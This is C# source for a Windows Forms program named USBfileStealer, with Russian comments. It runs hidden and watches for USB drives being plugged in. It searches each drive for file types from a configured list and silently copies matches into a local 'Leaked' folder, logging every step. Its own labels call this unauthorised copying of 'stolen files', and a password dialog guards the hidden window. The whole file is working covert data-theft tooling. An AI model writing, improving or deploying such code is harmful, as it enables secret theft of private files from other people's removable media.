using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace USBfileStealer
{
    public partial class Form1 : Form
    {
        /// <summary> 
        /// Функцианал сканирования HDD, а не флэшек (в случае если ПО запущено на флэшке и подключено к чужому ПК)
        /// </summary>
        /// <param name="Arg">Требуется -scanHDD для сканирования HDD, а не флэшек </param>
        public Form1(string[] Arg)
        {
         /*   foreach(string s in Arg)
                if (s.Equals("-scanHDD"))//
            this.Visible = false;*/
        }
        public Form1()
        {
            InitializeComponent();
            //this.Icon = Properties.Resources.
            listBox2.Items.AddRange(Properties.Settings.Default.filetags.Split(new string[] { "\r\n" }, StringSplitOptions.None));
            //Properties.Settings.Default.Save();
            this.Visible = false;
            this.IsVisibilityChangeAllowed = false;
            F = new ArrayList();
            if (File.Exists(Dir + @"\1LOG.txt"))
                File.AppendAllText(Dir + @"\1LOG.txt", Timenow() + " ============================================= Программа запущена"  + Environment.NewLine);
            else
            {
                Directory.CreateDirectory(Dir);
                File.AppendAllText(Dir + @"\1LOG.txt", Environment.NewLine+ Timenow()  + " ============================================= Программа запущена"  + Environment.NewLine );
            }
            T = new Thread(cheat);
            T.Start();//Проверка файлов по списку при запуске программы
            try { label1.Invoke((Action)(() => label1.Text = " Поиск USB-устройств при старте программы")); } catch { }
            File.AppendAllText(Dir + @"\1LOG.txt", Environment.NewLine + Timenow() + " Поиск USB-устройств при старте программы" + Environment.NewLine);
        }
        Thread T;
        protected override void SetVisibleCore(bool value)
        {
            try
            {
                if (this.IsVisibilityChangeAllowed)
                    base.SetVisibleCore(value);
            }
            catch (Exception eee) { }   
        }
        bool IsVisibilityChangeAllowed { get; set; }
        /// <summary>
        /// Список найденных файлов
        /// </summary>
        private ArrayList F;
        protected override void WndProc(ref Message m)
        {//Обнаружен съемный носитель:
            base.WndProc(ref m);
            const int WM_DeviceChange = 0x219; //что-то связанное с usb
            const int DBT_DEVICEARRIVAL = 0x8000; //устройство подключено
            const int DBT_DEVICEREMOVECOMPLETE = 0x8004; // устройство отключено
            if (m.Msg == WM_DeviceChange)
            {
                Thread T = new Thread(cheat);
                if (m.WParam.ToInt32() == DBT_DEVICEARRIVAL)
                {
                    try { label1.Invoke((Action)(() => label1.Text = "Подключено USB-устройство")); } catch { }
                    File.AppendAllText(Dir + @"\1LOG.txt", Timenow() + " Подключено USB-устройство"+  Environment.NewLine);
                    T.Start();//новое usb подключено
                }
                if (m.WParam.ToInt32() == DBT_DEVICEREMOVECOMPLETE)
                {
                    T.Abort();// usb отключено
                    File.AppendAllText(Dir + @"\1LOG.txt", Timenow() + " Отключено USB-устройство" + Environment.NewLine);
                    try { label1.Invoke((Action)(() => label1.Text = "Отключено USB-устройство")); } catch { }
                }
            }
        }
        string Dir = "Leaked " + DateTime.Now.ToString("yyyy.MM.dd");
        private void Form1_Load(object sender, EventArgs e)
        {
            this.Icon = Properties.Resources.USB_checker;
        }
        /// <summary>
        /// Поиск файлов на USB-носителе согласно списку и их копирование
        /// </summary>
        private void cheat()
        {
            F.Clear();
            Thread.Sleep(4000);//засыпаем чтобы дать носителю правильно определиться в операционой системе
            Stopwatch stopWatch = new Stopwatch(); TimeSpan ts; stopWatch.Start();
            foreach (var dInfo in DriveInfo.GetDrives())
                if (dInfo.IsReady && dInfo.DriveType == DriveType.Removable)
                {
                    File.AppendAllText(Dir + @"\1LOG.txt", Timenow() + " Начат поиск файлов" + Environment.NewLine);
                    try { label1.Invoke((Action)(() => label1.Text = "Ищу данные на устройстве: " + @dInfo.Name+" \""+ dInfo.VolumeLabel + "\" ("+ dInfo.DriveFormat+")")); } catch { }
                    for (int i = 0; i < listBox2.Items.Count; i++)
                    {
                        foreach (string file in Directory.GetFiles(@dInfo.Name, listBox2.Items[i].ToString(), SearchOption.AllDirectories))
                        {
                            F.Add(new FILEclass(file, Path.GetFileName(file)));
                            File.AppendAllText(Dir + @"\1LOG.txt", Timenow() + " Найден файл "+ file + Environment.NewLine);
                        }
                    }
                }
            if (F.Count != 0)
                if (File.Exists(Dir + @"\1LOG.txt"))
                    File.AppendAllText(Dir + @"\1LOG.txt", Timenow() + " Найдено файлов: " + F.Count.ToString() + Environment.NewLine);
                else
                {
                    Directory.CreateDirectory(Dir);
                    File.AppendAllText(Dir + @"\1LOG.txt",  Timenow() + " Начат поиск " + Environment.NewLine);
                }
            try { label1.Invoke((Action)(() => label1.Text = "Несанкционированно копирую найденные файлы")); } catch { }

            Directory.CreateDirectory(Dir);
            int copied = 0; int copy_err = 0; int exist = 0;
            for (int i = 0; i < F.Count; i++)
            {
                string sourceName = Path.GetFileName((((FILEclass)(F[i])).Fullname));
                string source = ((FILEclass)(F[i])).Fullname;
                string dest = Dir + @"\" + ((FILEclass)(F[i])).name;
                string destName = Path.GetFileName(Dir + @"\" + ((FILEclass)(F[i])).name);
                if (sourceName.Equals(destName))
                    if (File.Exists(source))
                        if (File.Exists(dest))
                            try
                            {
                                if (FileCompare(source, dest)) exist++; //такой файл уже есть
                                else//файла нет - несанкционированно копируем
                                {
                                    File.Copy(source, Dir + @"\" + Timenow() + "s. " + ((FILEclass)(F[i])).name);
                                    copied++;
                                }
                            }
                            catch{copy_err++; File.AppendAllText(Dir + @"\1LOG.txt", Timenow() + " Ошибка копирования файла: " + source + Environment.NewLine);}
                        else
                        {
                            try
                            {
                                File.Copy(source, dest);
                                copied++;
                            }
                            catch { copy_err++; File.AppendAllText(Dir + @"\1LOG.txt", Timenow() + " Ошибка копирования файла: " + source + Environment.NewLine); }
                        }
                    else
                    {
                        copy_err++; File.AppendAllText(Dir + @"\1LOG.txt", Timenow() + " Ошибка копирования файла: " + source + Environment.NewLine);
                    }   
                if (copied == 0)
                    try { label1.Invoke((Action)(() => label1.Text = "Подготовка к копированию файлов: " + F.Count + " шт.")); } catch { }
                else
                    try { label1.Invoke((Action)(() => label1.Text = "Скопировано файлов: " + copied)); } catch { }
            }
            stopWatch.Stop(); ts = stopWatch.Elapsed;            
            if (copied != 0)
                try { label1.Invoke((Action)(() => label1.Text = "Скопировано файлов: " + copied + " из " + F.Count + " шт. завершено за " + stopWatch.Elapsed)); } catch { } 
            else
                try { label1.Invoke((Action)(() => label1.Text = "Ничего не скопировано " + stopWatch.Elapsed)); } catch { } 

            if (copied != 0)            
                if (File.Exists(Dir + @"\1LOG.txt"))
                    File.AppendAllText(Dir + @"\1LOG.txt", Timenow() + " Cкопировано: " + copied + " из " + F.Count + ", ошибок копирования: " + copy_err + " (файлов совпадает: " + exist + "), время:" + stopWatch.Elapsed.TotalSeconds +" сек."+ Environment.NewLine);
                else
                {
                    File.Create(Dir + @"\1LOG.txt");
                    File.AppendAllText(Dir + @"\1LOG.txt", Timenow() + " Cкопировано: " + copied + " из " + F.Count + ", ошибок копирования: " + copy_err + " (файлов совпадает: " + exist + "), время:" + stopWatch.Elapsed.TotalSeconds + " сек." + Environment.NewLine);
                }            
        }
        private string Timenow() { return DateTime.Now.ToString(); }
        private void button1_Click(object sender, EventArgs e)
        {
            string Dir = "Leaked " + DateTime.Now.ToString("yyyy.MM.dd");
            Process Proc = new Process();
            Proc.StartInfo.FileName = "explorer";
            if (Directory.Exists(Dir))
                Proc.StartInfo.Arguments = Dir;
            else Proc.StartInfo.Arguments = Application.StartupPath;
            Proc.Start();
            Proc.Close();
        }
        private bool FileCompare(string file1, string file2)
        {
            int file1byte;
            int file2byte;
            FileStream fs1;
            FileStream fs2;
            if (file1 == file2)            
                return true;//на сравнние передан один и тот же файл
            
            fs1 = new FileStream(file1, FileMode.Open);
            fs2 = new FileStream(file2, FileMode.Open);
            if (fs1.Length != fs2.Length)
            {
                fs1.Close();
                fs2.Close();                
                return false;
            }
            do//размер файлов совпал, значит побитово сравним файлы
            {
                file1byte = fs1.ReadByte();
                file2byte = fs2.ReadByte();
            }
            while ((file1byte == file2byte) && (file1byte != -1));
            fs1.Close();
            fs2.Close();
            return ((file1byte - file2byte) == 0);
        }

        private void notifyIcon1_DoubleClick(object sender, EventArgs e)
        {
            this.Icon = Properties.Resources.USB_checker;
            this.Hide();
            pc = new pwdcheck(Icon);
            pc.ShowDialog();
            if (pc.DialogResult == DialogResult.OK)            
                if (pc.ReturnIsTrue())
                {
                    this.IsVisibilityChangeAllowed = true;
                    this.Show();
                 }            
        }
        private void выходToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (this.IsVisibilityChangeAllowed)
                this.Close(); 
            else
            {
                T.Abort();
                File.AppendAllText(Dir + @"\1LOG.txt", Timenow() + " ============================================= Программа безопасно остановлена" + Environment.NewLine);
                this.Close();
            }
        }
        pwdcheck pc;
        private void показатьОкноToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.Hide();
            pc = new pwdcheck(Icon);
            pc.ShowDialog();
            if (pc.DialogResult == DialogResult.OK)            
                if (pc.ReturnIsTrue())
                {
                    this.IsVisibilityChangeAllowed = true;
                    this.Show();
                }            
        }

        private void принудительноЗапустьToolStripMenuItem_Click(object sender, EventArgs e)
        {
            T = new Thread(cheat);
            T.Start();//Проверка файлов по списку при запуске программы
            File.AppendAllText(Dir + @"\1LOG.txt", Timenow() + " Запущен принудительный поиск файлов" + Environment.NewLine);
        }

        private void открытьУкраденныеФайлыToolStripMenuItem_Click(object sender, EventArgs e)
        {
            this.Hide();
            pc = new pwdcheck(Icon);
            pc.ShowDialog();
            if (pc.DialogResult == DialogResult.OK)
                if (pc.ReturnIsTrue())
                {
                    this.IsVisibilityChangeAllowed = true;
                    this.Show();


                    string Dir = "Leaked " + DateTime.Now.ToString("yyyy.MM.dd");
                    Process Proc = new Process();
                    Proc.StartInfo.FileName = "explorer";
                    if (Directory.Exists(Dir))
                        Proc.StartInfo.Arguments = Dir;
                    else Proc.StartInfo.Arguments = Application.StartupPath;
                    Proc.Start();
                    Proc.Close();
                }
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                T.Abort();
                notifyIcon1.Visible = false;
                if (File.Exists(Dir + @"\1LOG.txt"))
                    File.AppendAllText(Dir + @"\1LOG.txt", Timenow() + " ============================================= Программа безопасно остановлена" + Environment.NewLine);
            }
            catch { }
        }
        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            about Ab = new about(this.Icon);
            this.Hide();
            Ab = new about(Icon);
            Ab.ShowDialog();
            if (Ab.DialogResult == DialogResult.OK)
            {
                this.IsVisibilityChangeAllowed = true;
                this.Show();
            }
        }

        private void contextMenuStrip1_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {

        }
    }
    /// <summary>
    /// Информация о найденном файле
    /// </summary>
    public class FILEclass
    {
        public string Fullname;
        public string name;
        public FILEclass(string Fullname, string name)
        {
            this.Fullname = Fullname;
            this.name = name;
        }
    }
}